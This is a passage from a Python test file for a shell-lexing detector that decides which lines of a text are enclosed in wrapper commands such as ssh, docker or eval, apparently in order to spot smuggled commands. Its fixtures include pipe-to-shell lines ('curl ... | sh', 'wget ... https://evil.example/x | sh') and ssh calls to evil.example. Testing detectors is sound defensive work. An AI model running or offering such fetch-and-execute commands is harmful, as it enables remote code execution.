    assert _Wrapped(command, [10**6]).opener(shelllex.Opener("SQ", len(command) - 1, 0)) is True
    assert _begins_with_wrapper(command) is True


def test_a_comment_that_holds_a_quote_is_read_a_second_time_as_a_shell_that_reads_no_comment_reads_it():
    lines = ["docker run evil/img sh -c # '", _D, "'"]
    assert _enclosing_lines(lines, False)[1] is True
    assert _enclosing_lines(["echo hi # don't", _D], False)[1] is False                            # no wrapper begins that line
    assert _enclosing_lines(["docker run x # no quote here", _D], False)[1] is False
    assert _enclosing_lines(["ssh evil.example # `", _D, "`"], False)[1] is True


def test_a_comment_scan_is_linear_in_the_line():
    assert _reads_a_comment_as_words("ssh h" + " #" * 100000) is False
    assert _reads_a_comment_as_words("ssh h" + " #" * 100000 + "'") is True


@pytest.mark.parametrize("head,expected", [
    ("ssh h # 'x", True), ("ssh h # `x", True), ("docker run x sh -c # '", True), ("/usr/bin/ssh h # 'x", True), ("sudo ssh h # 'x", True),
    ("ssh h #'x", True), ("ssh h #", False), ("ssh h # x", False), ("ssh h 'x' # y", False), ("cd /path # it's", False), ("./evil h # 'x", False),
    ("echo hi # don't", False), ("source ~/.bashrc  # shell's", False), ("ssh h#'x", False),
    ("sudo # 'x", False), ("# 'x", False), ("$ # 'x", False), ("env # `x", False),
])
def test_a_comment_with_a_quote_is_read_as_words_only_behind_a_program_that_runs_what_it_is_given(head, expected):
    assert _reads_a_comment_as_words(head) is expected, head


def test_the_opener_of_a_subshell_is_no_wrappers_argument_and_what_a_line_opens_that_a_hypothesis_reads():
    assert _row([_S + " (\\", _D]) == "FF"
    assert _row(["It's x", "<<E " + _S + " sh", _D, "E"]) == "FFTT"                       # a here-document line is read from its column 0
    assert _row(["It's x", _S + " $(", _D, ")"]) == "FFTT"
    assert _row(["It's x", _S + " ${", _D, "}"]) == "FFTT"
    assert _row(["It's x", _S + " <<'E'", _D, "E"]) == "FFTT"


@pytest.mark.parametrize("word", ["doas", "command", "builtin", "ionice", "setsid", "eval", "step", "first", "next", "now", "pkexec", "caffeinate",
                                  "sudo", "env", "timeout", "nice", "stdbuf", "nohup", "time", "xargs", "unbuffer", "flock", "taskset"])
def test_each_word_that_may_stand_in_front_of_a_wrapper_leaves_the_script_that_ran_it_tainted(word):
    assert _row([f"{word} {_S} 'a", "b'", _D]) == "FTT", word


@pytest.mark.parametrize("word,runs", [
    ("bin/@x", True), ("bin/%x", True), ("bin/+x", True), ("bin/,x", True), ("bin/:x", True), ("dir/é", True), ("a/\\x", True), ("bin/*", True),
    ("bin/[a-z]*", True), ("/@evil", True), ("/%x", True), ("/+x", True), ("//é", True), ("/'evil'", True), ("x/", False), ("pool/", False), ("bin/>x", False), ("src/,", False), ("src/)", False), ("src/;", False), ("src/:", False), 
    ("`bin/evil`", False), ("**bin/evil**", False), ("_bin/evil_", False), ('"bin/evil"', False), ("(bin/evil)", False),
    ("/", False), ("//", False), ("/*", False), ("/>", False), ("///", False),
])
def test_a_first_word_with_a_slash_and_something_after_it_is_a_program_unless_it_is_only_slashes_a_star_or_a_tag_end(word, runs):
    assert _begins_with_wrapper(f"{word} 'x") is runs, word
    assert _enclosing_lines([f"{word} 'x", _D, "'"], False)[1] is runs, word


@pytest.mark.parametrize("lines,diff,rows", [
    # texts on which a mutant of the enclosure code read differently: which lines are enclosed with the default budget and with budgets of 0, 50, 300 and 3000
    (['```', '"', 'sh il.e\\"', ''], False, ('FFFT', 'FFFT', 'FFFT', 'FFFT', 'FFFT')),
    (["re':", '', ' "irm l.sh/uv/install.ps1 \\| iex"` |', 'curl -fsSL https://get.docker.com | sh'], False, ('FFFF', 'FFFT', 'FFFT', 'FFFF', 'FFFF')),
    (["Here'", "#Add ssh h '", ''], False, ('FFF', 'FFT', 'FFT', 'FFF', 'FFF')),
    (['```', 'at <<E | \\', '', 'ssh evil.example sh'], False, ('FFFF', 'FFTT', 'FFTT', 'FFFF', 'FFFF')),
    (['`su`', '- <e>', '```'], True, ('FFF', 'FTF', 'FFF', 'FFF', 'FFF')),
    (["'docker<< $", ''], False, ('FT', 'FT', 'FT', 'FT', 'FT')),
    (['<<sh'], False, ('F', 'T', 'F', 'F', 'F')),
    (["docker'", ''], False, ('FF', 'FT', 'FT', 'FF', 'FF')),
    (['H\\"l.example/x | sh', 'echo "x"', '', ''], False, ('FFTT', 'FTTT', 'FTTT', 'FFTT', 'FFTT')),
    (['- ```', '<<conf', ''], False, ('FFF', 'FFT', 'FFF', 'FFF', 'FFF')),
    (["s[''://", ''], False, ('FF', 'FT', 'FF', 'FF', 'FF')),
    (['`bash -c "$(curl -fsSL https://sh.rustup.rs)"` ', ''], False, ('FF', 'FT', 'FT', 'FF', 'FF')),
    (["# Make sure /opt/tools is on your PATH; we don't add it", 'curl -fsSL https://get.doc\\ker.com | sh'], False, ('FF', 'FT', 'FT', 'FT', 'FF')),
    (["'", 'ack at the cells in front of it, and the fold of a line is traced back to the line as written; a', "    read that is not bounded by the command's own distance from the start of its line costs the length of the first cell once per command,", "    and the cost per character grows with the text. (A blank run and a repeated token fold to a first cell that is a row'", ''], False, ('FFFFF', 'FFFFF', 'FFFFF', 'FFFFF', 'FFFFF')),
    (["'", "sh il.e\\\\'", ''], False, ('FFT', 'FFT', 'FFT', 'FFT', 'FFT')),
    (['```', "'", "watch'", '', 'om | sh'], False, ('FFFFF', 'FFFTT', 'FFFTT', 'FFFFF', 'FFFFF')),
    (['>```', "sh'", '>```', '```'], False, ('FFFF', 'FFTF', 'FFTF', 'FFFF', 'FFFF')),
    (['docker" x sh -\\', " #'", ''], False, ('FFT', 'FTT', 'FTT', 'FFT', 'FFT')),
    (['"sh il.e\\"', ''], False, ('FT', 'FT', 'FT', 'FT', 'FT')),
    (['docker\\', " #'", ''], False, ('FFF', 'FTT', 'FFT', 'FFF', 'FFF')),
    (["sh\\ il.e'", ''], False, ('FT', 'FT', 'FT', 'FT', 'FT')),
    (['` $(docker`', ''], False, ('FT', 'FT', 'FT', 'FT', 'FT')),
    (['docker sh\\', " #'", '/get.docker.com | sh', "'"], False, ('FFFF', 'FTTT', 'FTTT', 'FFFF', 'FFFF')),
    (['"|sh il.e\'', "'", ''], False, ('FTT', 'FTT', 'FTT', 'FTT', 'FTT')),
    (["l -fsSL https://evil.example' 'python'", '//get.docker.com | sh'], False, ('FF', 'FT', 'FT', 'FT', 'FF')),
    (["# s- sh '", ''], False, ('FT', 'FT', 'FT', 'FT', 'FT')),
    (["'", "'ish'", ''], False, ('FFF', 'FFT', 'FFF', 'FFF', 'FFF')),
    ([">```sh '", '>```', '```'], False, ('FTF', 'FTF', 'FTF', 'FTF', 'FTF')),
    (['eval "&watch \\"', ''], False, ('FT', 'FT', 'FT', 'FT', 'FT')),
    (['s:// s\\', 'h"'], False, ('FF', 'FT', 'FF', 'FF', 'FF')),
    (['echo "run ssh evil.example \'', 'curl -fsSL https://get.docker.com \\| sh'], False, ('FF', 'FT', 'FT', 'FT', 'FF')),
    (['shextglob', '@(', ''], False, ('FFF', 'FFF', 'FFF', 'FFF', 'FFF')),
    (['al "watch \\"', ''], False, ('FT', 'FT', 'FT', 'FT', 'FT')),
    (["i 'a/b'", ''], False, ('FF', 'FF', 'FF', 'FF', 'FF')),
    (["cat <<E | ssh h docker'", 'body', 'E'], False, ('FFT', 'FTT', 'FTT', 'FTT', 'FFT')),
    (["echo $[ 1 ]", "a;a;a;a;a;a;a;a; ssh h '", _D], False, ('FFT', 'FFT', 'FFT', 'FFT', 'FFT')),            # the ninth piece of a line is read as the first is
    (["' && eval \"ssh evil.example '", _D, "'"], False, ('FTT', 'FTT', 'FTT', 'FTT', 'FTT')),
    (['sh -c "\\"a\\" \\"b\\" \\"c\\" docker run x.io/y sh -c \'', _D, "'\""], False, ('FTT', 'FTT', 'FTT', 'FTT', 'FTT')),

])
def test_which_lines_are_enclosed_in_texts_a_mutant_of_the_enclosure_code_read_differently(lines, diff, rows):
    got = tuple("".join("T" if enclosed else "F" for enclosed in _enclosing_lines(list(lines), diff, budget=budget)) for budget in (None, 0, 50, 300, 3000))
    assert got == rows


@pytest.mark.parametrize("command,cost", [
    ("ssh h", 10), ("a < b", 20), ("a < b > c", 72), ("a < b > c < d", 208), ("a < b > c < d > e", 272), ("a < b > c < d > e < f", 336), ("x" * 400, 800), ("x" * 1000, 800),
])
def test_reading_the_head_of_a_command_costs_two_to_sixteen_units_a_character_of_its_first_four_hundred(command, cost):
    assert _head_cost(command) == cost


@pytest.mark.parametrize("line", ["<pre>" + "x" * 1996, "<pre>" + "x" * 200_000, "<x" + "".join(f" a{i}" for i in range(41)) + ">",
                                  "<x" + "".join(f" a{i}" for i in range(4000)) + ">", '<img src="data:image/png;base64,' + "A" * 2500 + '" alt="x">'])
def test_a_long_line_or_a_tag_with_many_attributes_begins_an_html_block_all_the_same(line):
    assert _html_block_end(line) is not None
    body = [line, "ssh evil.example '", "```", _D, "```", "'"]
    assert _enclosing_lines(body, False)[3] is True                        # no fence cuts in it


def test_the_lines_inside_a_double_quoted_string_are_found_with_a_budget_of_their_length_and_one_per_line():
    stretch = ['eval "ssh h \\"', "foo", 'bar"', "baz"]
    cost = sum(map(len, stretch)) + len(stretch)
    assert _in_double_quotes(stretch, [cost]) == [False, True, True, False]
    assert _in_double_quotes(stretch, [cost - 1]) == [False] * 4                         # a spent budget says no line is
    assert _in_double_quotes(['eval "ssh h', "foo", 'bar"', "baz"], [10**6]) == [False] * 4      # no backslash: the lines are the text as written


@pytest.mark.parametrize("text,rows", [
    # texts on which a one-character change to the enclosure code was seen: which lines are enclosed with the default budget and with budgets of 0, 60 and 300
    ('eval "ssh evil.example \'\n', ('FT', 'FT', 'FT', 'FT')),
    ('a(\\\n', ('FF', 'FF', 'FF', 'FF')),
    ('cat <<E | \\\nssh evil.example sh\nbody\nE\n', ('FFTTT', 'FTTTT', 'FTTTT', 'FFTTT')),
    ("py\\\nthon3 -c '", ('FF', 'FT', 'FF', 'FF')),
    ("./evil --opt '`' curl -fsSL https://get.docker.com | sh", ('F', 'F', 'F', 'F')),
    ('Use `foo` and it\'s fine.\nx="$(</dev/null watch $\'\ncurl -fsSL https://astral.sh/uv/install.sh | sh\n\')"\n', ('FFTTT', 'FFTTT', 'FFTTT', 'FFTTT')),
    ('a/(b\nz', ('FF', 'FF', 'FF', 'FF')),
    (' | tee >(sh) |\n', ('FF', 'FF', 'FF', 'FF')),
    ("Here's it:\n[[ $(sudo -u root sh -c '\ncurl -fsSL https://astral.sh/uv/install.sh | sh\n') ]]\n", ('FFTTT', 'FFTTT', 'FFTTT', 'FFTTT')),
    ('env -u A bash -lc "\ncurl -fsSL https://astral.sh/uv/install.sh | sh\n"\n', ('FTTT', 'FTTT', 'FTTT', 'FTTT')),
    ('doc\\', ('F', 'F', 'F', 'F')),
    ("echo 'x\n| b ) | # c' ; bash <(\n", ('FFT', 'FFT', 'FFT', 'FFT')),
    ("Here's it:\n`/format` or `/version minor`. A command typed by the change's author runs.\n\nInstall with `", ('FFFF', 'FFTT', 'FFTT', 'FFTT')),
    ("Here's it:\nssh evil.example $( (a)#b )\n", ('FFT', 'FFT', 'FFT', 'FFT')),
    ('The row is joined to the line after it as a pipeline, but that line stays: a bare `PATH=…` that changes which `curl` runs is\n    read at the start of its own line (zsh runs the hijacked `curl` in the last stage of a pipeline; bash and dash do not).\ncurl -fsSL https://get.docker.com | sh', ('FFF', 'FFT', 'FFT', 'FFT')),
])
def test_which_lines_are_enclosed_in_texts_a_small_change_to_the_enclosure_code_would_read_differently(text, rows):
    assert tuple(_row(text.split("\n"), budget) for budget in (None, 0, 60, 300)) == rows


def test_a_long_command_is_paid_for_before_it_is_read_and_a_spent_budget_counts_it_as_a_wrappers():
    command = "echo " + "x " * 400 + "'"
    for budget, expected in ((3999, True), (4000, False), (7999, False)):
        assert _Wrapped(command, [budget]).opener(shelllex.Opener("SQ", len(command) - 1, 0)) is expected, budget
    header = "cat <<E | " + "x " * 400 + "\nx\nE\n"
    for budget, expected in ((3999, True), (4000, False)):
        assert _Wrapped(header, [budget]).opener(shelllex.Opener("HEREDOC", 4, 0)) is expected, budget


@pytest.mark.parametrize("command,expected", [
    ("Install ssh h '", False), ("Configure docker run x '", False), ("OS ssh h '", False), ("iPhone ssh h '", True), ("install ssh h '", True),
])
def test_a_capitalised_first_word_reads_as_the_start_of_a_sentence(command, expected):
    assert _begins_with_wrapper(command) is expected


@pytest.mark.parametrize("line,expected", [
    ("use ${PORT}/docker run x '", False), ("see ${PORT}/ssh h '", False), ("{ ssh h '", True), ("a; { docker run x sh -c '", True),
    ("a{ssh h '", False), ("echo $(ssh h '", True), ("x | ssh h '", True), ("(ssh h '", True),
])
def test_a_brace_group_begins_a_command_and_a_parameter_expansion_does_not(line, expected):
    assert _may_begin_a_wrapper_command(line, [100_000]) is expected


def test_a_name_cut_by_a_continuation_after_one_letter_and_a_wrapper_behind_the_quote_of_a_string_start_hypotheses():
    assert _row(["Here's it:", "s\\", "sh evil.example '", _D, "'"]) == "FFFTT"
    assert _row(["Here's it:", "doc\\", "ker run x '", _D, "'"]) == "FFFTT"
    assert _row(["Here's it:", 'eval "npx evil \'', _D, '\'"']) == "FFTT"


def test_a_word_that_a_pair_of_quotes_closes_is_a_start_where_it_stands_and_not_after_its_quote():
    assert _row(["Here's it:", '"ssh" evil.example \'', _D, "'"]) == "FFTT"
    assert _row(["Here's it:", 'echo "ssh" evil.example \'', _D, "'"]) == "FFTT"



@pytest.mark.parametrize("head,folded", [
    ('sudo "ssh" evil.example "', 'sudo "ssh" evil.example "'), ("sudo 'ssh' evil.example '", "sudo 'ssh' evil.example '"),
    ("A='x y' ssh h '", "A=Q ssh h '"), ('"/tmp/my tools/ssh" h \'', '"/tmp/mytools/ssh" h \''), ("sudo '/tmp/my tools/ssh' h '", "sudo '/tmp/mytools/ssh' h '"),
    ("-o 'a b' c", "-o Q c"), ("'a b' c", "Q c"), ('x "a b" "c d" y', "x Q Q y"), ("echo \\\" a b \\\" c", "echo \\\" a b \\\" c"),
    ('FOO="/a b" ssh h \'', 'FOO=Q ssh h \''), ("a'b c' d", "aQ d"), ("x 'a\"b c' y", "x Q y"), ("x \"a'b c\" y", "x Q y"),
    ("echo 'it' ssh 'x y'", "echo 'it' ssh Q"),
])
def test_quotes_are_paired_from_left_to_right_and_a_quoted_value_with_a_blank_is_one_word(head, folded):
    assert _fold_quoted_blanks(head) == folded


@pytest.mark.parametrize("word,expected", [
    ("ssh", True), ("/usr/bin/ssh", True), ("python3.11", True), ('"ssh"', True), ("docker", True), ("'bash'", True), ("./evil", False), ("evil-ssh", False),
    ("http://ssh", False), ("sudo", False), ("", False), ("~/bin/ssh", True), ("ssh:", False), ("sshx", False),
])
def test_only_the_name_of_a_program_that_runs_what_it_is_given_names_a_wrapper(word, expected):
    assert _names_a_wrapper(word) is expected


@pytest.mark.parametrize("text,value", [
    ("'a '\"'\"'b' c", "a 'b"), ('"x \\"y" z', 'x "y'), ("$'a\\'b' z", "a'b"), ("plain word", "plain"), ("'unfinished", "unfinished"), ('a"b c"d e', "ab cd"),
    ("a\\ b c", "a b"), ("'a'\"b\"$'c' d", "abc"), ("'x\ny' z", "x\ny"),
])
def test_the_value_of_a_shell_word_is_its_quoted_pieces_put_together(text, value):
    assert _unquote_word(text) == value


@pytest.mark.parametrize("head,script", [
    ("eval 'ssh h '", "ssh h "), ('eval "ssh h \\"x"', 'ssh h "x'), ("eval $'ssh h \\'x'", "ssh h 'x"), ("sudo eval 'a b'", "a b"), ("eval 'a '\"'\"'b'", "a 'b"),
    ("eval ssh h", None), ("evaluate 'x'", None), ("echo eval 'x'", None),
])
def test_eval_runs_the_script_its_first_word_is_the_value_of(head, script):
    assert _eval_content(head) == script


@pytest.mark.parametrize("line,kind,column", [("a' b", "SQ", 1), ("a\\' b' c", "SQ", 2), ('a\\" b" c', "DQ", 5), ("a\\\\\" b", "DQ", 3), ("a` b", "BQ", 1), ("a", "SQ", -1), ("a'", "CMD", -1)])
def test_the_string_that_began_above_ends_at_its_first_unescaped_quote(line, kind, column):
    assert _closing_column(line, kind) == column


@pytest.mark.parametrize("rest,after", [(" | sh", " sh"), (" y z | sh -s", " sh -s"), (" 'a | b' | sh", " sh"), (' "a|b" x | bash', " bash"), (" || sh", None), (" ; sh", None),
                                        (" && x | sh", None), (" $'a|b' | sh", " sh"), ("", None), (" x", None)])
def test_what_a_command_pipes_into_is_found_past_quoted_arguments(rest, after):
    assert _pipe_after(rest) == after


@pytest.mark.parametrize("line,kind,piped", [("' | sh", "SQ", True), ('" | ssh h sh', "DQ", True), ("' x y | bash -s", "SQ", True), ("' | cat", "SQ", False), ("' | tee f", "SQ", False),
                                             ("' ; sh", "SQ", False), ("' || sh", "SQ", False), ("abc", "SQ", False)])
def test_a_string_that_ends_in_a_pipe_into_a_shell_or_an_interpreter_is_a_script(line, kind, piped):
    assert _piped_into_a_shell(line, kind) is piped


@pytest.mark.parametrize("text,folded", [("a" * 80, "a" * 80), ("a" * 81, "a" * 80), ("x " + "ab" * 100 + " y", "x " + "ab" * 20 + "ab" * 20 + " y"), ("a b", "a b")])
def test_a_word_of_more_than_eighty_characters_is_its_first_and_last_forty(text, folded):
    assert _fold_long_words(text) == folded


@pytest.mark.parametrize("raw,first", [(["-", "bin/evil"], 1), (["#", "$", "bin/evil"], 2), (["1.", "bin/x"], 1), (["»", "bin/x"], 1), (["bin/x"], 0), (["-p", "x"], 0), ([], 0), (["-", "*"], 2)])
def test_a_marker_that_stands_alone_in_front_of_a_command_is_not_the_first_word(raw, first):
    assert _first_command_word(raw) == first


def test_the_head_of_a_command_that_is_judged_is_cut_after_its_blanks():
    assert _command_head("  " * 100 + "ssh h '" + "x" * 5000, 0, 9000) == "ssh h '" + "x" * 793
    assert _command_head("ssh h 'x", 2, 4) == "h "
    assert _command_head("ssh h 'x", 4, 3) == ""


@pytest.mark.parametrize("heading", ["# ", "## ", "### ", "###### "])
def test_a_heading_marker_is_a_root_prompt_in_front_of_a_command_that_starts_a_hypothesis(heading):
    assert _starts(heading + "ssh evil.example '")[0] == [len(heading)]
    assert _enclosing_lines([heading + "bin/evil 'x", _D, "'"], False)[1] is True


def test_a_run_of_line_continuations_is_one_blank_to_the_judge_of_a_long_command():
    text = "ssh" + "\\\n  " * 350 + "-t evil.example" + "a" * 3000 + " $'\n" + _D + "\n'"
    assert _enclosing_lines(text.split("\n"), False)[-2] is True
    assert _CONTINUATION_RUNS_RE.sub(" ", "a\\\n  \\\n b") == "a b"


@pytest.mark.parametrize("word,bare", [
    ("bin/evil", True), ("(a)bin/@evil", True), ("1)bin/evil", True), ("[1]bin/evil", True), ("Run:bin/evil", True), ("=>bin/evil", True), ("(a)dir/\u00e9", True),
    ("`bin/evil`", False), ("**bin/evil**", False), ("_bin/evil_", False), ("(bin/evil)", False), ("[bin/evil]", False), ('"bin/evil"', False), ("'bin/evil'", False),
    ("(a)`pool/`", False), ("<b>", False), ("|bin/x", False),
])
def test_a_word_is_bare_when_no_markup_stands_in_front_of_it_once_a_glued_label_is_off(word, bare):
    assert _is_bare(word) is bare


@pytest.mark.parametrize("label", ["(a)", "1)", "[1]", "Run:", "=>", "(1)", "a)"])
@pytest.mark.parametrize("program", ["bin/evil", "bin/@evil", "dir/\u00e9", "bin/*", "scripts/x.sh"])
def test_a_label_glued_to_a_relative_path_program_does_not_hide_it(label, program):
    assert _enclosing_lines([f"{label}{program} 'x", _D, "'"], False)[1] is True


@pytest.mark.parametrize("lines,diff,rows", [
    # texts on which a mutant of the script, stack, prompt and window code read differently: which lines are enclosed with the default budget and with budgets of 0, 50, 300 and 3000
    (['"\' | bash', "'"], False, ('FF', 'FF', 'FF', 'FF', 'FF')),
    (['```', "o 'a", "' | b  ssh evil.example 'x 'x", ''], False, ('FFTF', 'FFTT', 'FFTT', 'FFTT', 'FFTF')),
    (["'t:", '"\' | bash', ''], False, ('FTF', 'FTF', 'FTF', 'FTF', 'FTF')),
    (["eval 'ssh h\\'x'", 'curl -fsSL https://get.docker.com | sh'], False, ('FT', 'FT', 'FT', 'FT', 'FF')),
    (["'", "'|sh"], False, ('FT', 'FT', 'FT', 'FT', 'FT')),
    (["+shil.example '", "t'd", 'c"url -fsSL https://get.docker.com | sh'], False, ('FFF', 'FTT', 'FTT', 'FTT', 'FFF')),
    (["Here't", 'Installing with curl works: `curl -fsSL https://get.docker.com | sh`', ''], False, ('FFF', 'FFT', 'FFT', 'FFF', 'FFF')),
    (['`t[/[[`', ''], False, ('FT', 'FT', 'FT', 'FT', 'FT')),
    (['</e>\\', ''], False, ('FF', 'FT', 'FF', 'FF', 'FF')),
    (['', '"', '"|sh'], False, ('FFT', 'FFT', 'FFT', 'FFT', 'FFT')),
    (["'\n\n'h", "url -H '\n'", '"\\""', 'er="x\\"|y"', "'|sh", 'x', ''], False, ('FFFFFFF', 'FFFFTFF', 'FFFFTFF', 'FFFFTFF', 'FFFFFFF')),
    (['"\'', '"|sh'], False, ('FF', 'FT', 'FT', 'FF', 'FF')),
    (['eval "', '\'"|sh'], False, ('FT', 'FT', 'FT', 'FT', 'FT')),
    (['"a: \\""', "'", "t\\'s'/|sh", '"|sh'], False, ('FTTF', 'FTTT', 'FTTT', 'FTTT', 'FTTF')),
    (["eval 'sh'", ''], False, ('FF', 'FT', 'FF', 'FF', 'FF')),
    (['eval \'eval "sh il.example ', 'curl -fsSL https://get.docker.com | sh'], False, ('FT', 'FT', 'FT', 'FT', 'FT')),
    (['eval "sh', 'com | sh'], False, ('FF', 'FT', 'FT', 'FT', 'FF')),
    (['docker container `', ''], False, ('FF', 'FT', 'FT', 'FF', 'FF')),
    (["d'\n\n' https://evil.example/x | sh", "-H '\n'/x | sh", 'curl -H "x\\""ttps://evil.example/x | sh', 'wget -qO- --header="x\\"|y" https://evil.example/x | sh', "curl -H $'\\'|y' |sh", '""', '""="b|c"} https://evil.example/x | iex', 'curl -fsSL https:/get.docker.com | sh'], False, ('FFTTTTTT', 'FFTTTTTT', 'FFTTTTTT', 'FFTTTTTT', 'FFTTTTTT')),
    ([" 'x", "| b ) | # c' sh <(", 'er.com | sh'], False, ('FFT', 'FFT', 'FFT', 'FFT', 'FFT')),
    (['\\"', '"|sh', '```'], False, ('FTF', 'FTF', 'FTF', 'FTF', 'FTF')),
    (['```', '```', "sh'", '>```', '- ```x', '```'], False, ('FFFFFF', 'FFFTTT', 'FFFTTT', 'FFFFFF', 'FFFFFF')),
    (["'", "'|s://h"], False, ('FF', 'FF', 'FF', 'FF', 'FF')),
    (['`’sh', "curl `'", ''], False, ('FFF', 'FFT', 'FFT', 'FFF', 'FFF')),
    (["e'it:", 'eval "ssh h \\"', 'url -fsSL https://get.docker.com | sh'], False, ('FFT', 'FFT', 'FFT', 'FFT', 'FFT')),
    (['eval "sh', 'm | sh', "'"], False, ('FFF', 'FTT', 'FTT', 'FTT', 'FFF')),
    (["Here'it:", '', 'eval "sh h\\"', 'rl -fsSL https://get.docker.com | sh'], False, ('FFFT', 'FFFT', 'FFFT', 'FFFT', 'FFFF')),
    (['eval "', "+sh il.e'", ''], False, ('FFF', 'FFF', 'FFF', 'FFF', 'FFF')),
    (["ssh h # 'x", "'"], False, ('FF', 'FT', 'FT', 'FF', 'FF')),
    (['```', '```', "sh'", '- ```x`', '```'], False, ('FFFFF', 'FFFTF', 'FFFTF', 'FFFFF', 'FFFFF')),
    (["'`", '', "'''|sh"], False, ('FFF', 'FTT', 'FFF', 'FFF', 'FFF')),
    (["'", "''''|sh"], False, ('FF', 'FF', 'FF', 'FF', 'FF')),
    (["'", "'\\n' |sh"], False, ('FF', 'FF', 'FF', 'FF', 'FF')),
    (['powershell `', ''], False, ('FF', 'FT', 'FT', 'FF', 'FF')),
    (['', '"\'', '"|sh'], False, ('FFF', 'FFT', 'FFT', 'FFF', 'FFF')),
    (['```', 'ssh evil.example \\', ">(tee f) '", ''], False, ('FFFT', 'FFTT', 'FFTT', 'FFTT', 'FFFT')),
    (["sh h'", "&& ssh h '", '" | ssh mple \'', " $ ssh h '", "- ' && ssh evil.exampl", 'b "| ssh e\'', "`a; x=1 && ssh h '"], False, ('FTTTTTT', 'FTTTTTT', 'FTTTTTT', 'FTTTTTT', 'FTTTTTT')),
    (['docker container run l "', ''], False, ('FT', 'FT', 'FT', 'FT', 'FT')),
    (["tps://e.example' 'python'", 'curl -fsSL https://get.docker.com | sh'], False, ('FF', 'FT', 'FT', 'FF', 'FF')),
    (['eval "', '\\'], False, ('FF', 'FF', 'FF', 'FF', 'FF')),
    (["e't", 'docker eval "sh\\', ' -fsSL https://get.docker.com | sh'], False, ('FFF', 'FFT', 'FFT', 'FFT', 'FFF')),
    (["'", "'", "sh h'", "'", '" evil.example \'', "echo '`' && ssh evil.example -o 'A=`' '", "echo `x` && ssh evil.example '", "a\\ 'b' ssh h '", " ssh h '", "  $ ssh h '", '-', 'b "|sh '], True, ('FFFTTTTTTTTT', 'FFFTTTTTTTTT', 'FFFTTTTTTTTT', 'FFFTTTTTTTTT', 'FFFTTTTTTTTT')),
    (['cat <<E | \\', '\\', 'ssh evil.exa$(mple sh', 'body', 'E', '', '', 'curl -fsSL https://get.docker.com | sh', "'"], False, ('FFFTTTTTT', 'FTTTTTTTT', 'FTTTTTTTT', 'FTTTTTTTT', 'FFFTTTTTT')),
    (["e's it:", 'eval "ssh h \\"', 'curl -fsSL https://get.docker.com | sh'], False, ('FFT', 'FFT', 'FFT', 'FFT', 'FFT')),
    (['```', 'al "&watch \\"', ''], False, ('FFT', 'FFT', 'FFT', 'FFT', 'FFT')),
    (["'docker <`", ''], False, ('FT', 'FT', 'FT', 'FT', 'FT')),
    (['', "sh h'", "'", '"sh il.', '"|sh '], True, ('FFFFT', 'FFTTT', 'FFTTT', 'FFTTT', 'FFFFT')),
    (['doc\\', 'ker', ''], False, ('FFF', 'FTT', 'FFF', 'FFF', 'FFF')),
    (["He'", "'>/x'", ''], False, ('FFF', 'FFT', 'FFT', 'FFF', 'FFF')),
    (['eval "\\)', ''], False, ('FF', 'FF', 'FF', 'FF', 'FF')),
    (['\' "sh il.e\'', ''], False, ('FT', 'FT', 'FT', 'FT', 'FT')),
    # documents on which a mutant of a character class, a set or a bound of the enclosure code (a bound on the stacks, the depth of an eval, the words of a head) read differently
    (["sh'", '````'], False, ('FF', 'FF', 'FF', 'FF', 'FF')),
    (["sh$'", 'er.com | sh'], False, ('FF', 'FT', 'FT', 'FF', 'FF')),
    (["o'", "'>/x'", ''], False, ('FFT', 'FFT', 'FFT', 'FFT', 'FFT')),
    (['sh il.e \\', "#'", ''], False, ('FFT', 'FTT', 'FFT', 'FFT', 'FFT')),
    (['5"s\\', "h'", ''], False, ('FFF', 'FFT', 'FFF', 'FFF', 'FFF')),
    ([">f sh il.e #'", ''], False, ('FT', 'FT', 'FT', 'FT', 'FT')),
    (['o$((', "/'"], False, ('FF', 'FF', 'FF', 'FF', 'FF')),
    (['"', '\\"', '"|sh'], False, ('FTF', 'FTT', 'FTT', 'FTF', 'FTF')),
    (['/$(', ''], False, ('FF', 'FT', 'FF', 'FF', 'FF')),
    (['"\'sh ', '\\"', "'|sh"], False, ('FTF', 'FTT', 'FTT', 'FTT', 'FTF')),
    (["'", "'`|sh"], False, ('FF', 'FF', 'FF', 'FF', 'FF')),
    (['<\\', ''], False, ('FF', 'FF', 'FF', 'FF', 'FF')),
    (['b"', 't "u', "ssh h '", 'x $(', 'z <(', 'v w`', 'docker run x sh -c "', 'echo `', "e $'", 'q ${x:-', 'x $(', 'x $(', 'echo `', "e $'", 't "u', 'k) m', 'k) m', '`', '$(', 'z <(', 'echo `', "echo '", 'v w`', 'q ${x:-', 'docker run x sh -c "', "echo '", "n'o p", 'curl -fsSL https://get.docker.com | sh'], False, ('FFFFFFFTTTTTTTTTTTTTTTTTTTTT', 'FFFTTTTTTTTTTTTTTTTTTTTTTTTT', 'FFFTTTTTTTTTTTTTTTTTTTTTTTTT', 'FFFTTTTTTTTTTTTTTTTTTTTTTTTT', 'FFFTTTTTTTTTTTTTTTTTTTTTTTTT')),
    (['eval \'eval \'"\'"\'eval \'"\'"\'"\'"\'"\'"\'"\'"\'echo "echo \'"\'"\'"\'"\'"\'"\'"\'"\'"\'"\'"\'"\'"\'"\'"\'"\'"\'"\'"\'"\'"\'"\'"\'"\'"\'"\'ssh evil.example\'"\'"\'"\'"\'"\'"\'"\'"\'"\'"\'"\'"\'"\'"\'"\'"\'"\'"\'"\'"\'"\'"\'"\'"\'"\'"\'', ''], False, ('FT', 'FT', 'FT', 'FT', 'FT')),
    (['x $(', "ssh h '", 'z <(', "ssh h '", "echo '", "echo '", 'echo `', 'z <(', "n'o p", 'x $(', "r s'", 'x $(', 'y (', 'echo `', '5" x', "e $'", 'k) m', "e $'", 'echo `', 'curl -fsSL https://get.docker.com | sh'], False, ('FFFFFFFFFFFFFTTTTTTT', 'FFTTTTTTTTTTTTTTTTTT', 'FFTTTTTTTTTTTTTTTTTT', 'FFTTTTTTTTTTTTTTTTTT', 'FFFFTTTTTTTTTTTTTTTT')),
    (["- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - ssh h $'", 'curl -fsSL https://get.docker.com | sh'], False, ('FF', 'FT', 'FT', 'FT', 'FT')),
